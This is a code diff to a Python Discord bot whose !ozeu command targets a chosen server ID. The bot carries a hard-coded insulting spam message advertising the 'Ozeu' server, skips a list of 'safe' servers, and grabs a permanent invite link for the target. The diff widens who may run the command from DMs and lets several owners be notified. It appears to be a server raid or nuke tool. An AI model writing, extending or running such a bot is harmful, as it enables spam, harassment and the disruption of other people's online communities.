@@ -12,7 +12,11 @@ import platform
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
 # オーナーID
-OWNER_ID = 1406978681481461941
+OWNER_ID = [
+    1406978681481461941,
+    1362090864968601943,
+    1386979993686638635,
+]
 riku = 1406978681481461941
 SPAM_MESSAGE = (
     "# バカどもがw とっととOzeu鯖入っとけw\n"
@@ -120,12 +124,11 @@ async def remove_dev(interaction: discord.Interaction, user: discord.User):
 # --- !ozeu コマンド ---
 @bot.command(name="ozeu")
 async def ozeu(ctx, guild_id: str = None):
+    # DMならOWNERかdev_usersのみ許可
     if ctx.guild is None:
-        # --- DMで実行された場合はオーナーチェック ---
-        if ctx.author.id != riku:
-            await ctx.send("❌ このコマンドはBotのオーナーのみ使用できます。")
+        if ctx.author.id not in dev_users:
+            await ctx.send("❌ このコマンドはBotの開発者権限ユーザーのみ使用できます。")
             return
-
         if guild_id is None:
             await ctx.send("❌ サーバーIDを指定してください。例: `!ozeu <guild_id>`")
             return
@@ -137,14 +140,12 @@ async def ozeu(ctx, guild_id: str = None):
             await ctx.send(f"❌ ID {guild_id} のサーバーが見つかりません。")
             return
     else:
-        # --- サーバー内で実行された場合（誰でも使える） ---
         if ctx.guild.id in safe_servers:
             await ctx.send("❌ このサーバーは安全リストに登録されているため、!ozeuは実行できません。")
             return
         guild = ctx.guild
 
-    # この後の共通処理
-    await ctx.send(f"✅ サーバー `{guild.name}` で !ozeu が実行されました。")
+    owners = [await bot.fetch_user(owner_id) for owner_id in OWNER_ID]
 
     # --- 招待リンク取得（無期限・無制限）---
     invite_url = "取得できませんでした"
@@ -711,4 +712,3 @@ async def auto_leave_small_servers(interaction: discord.Interaction, threshold: 
     await interaction.followup.send(msg, ephemeral=True)
 
 bot.run(TOKEN)
-
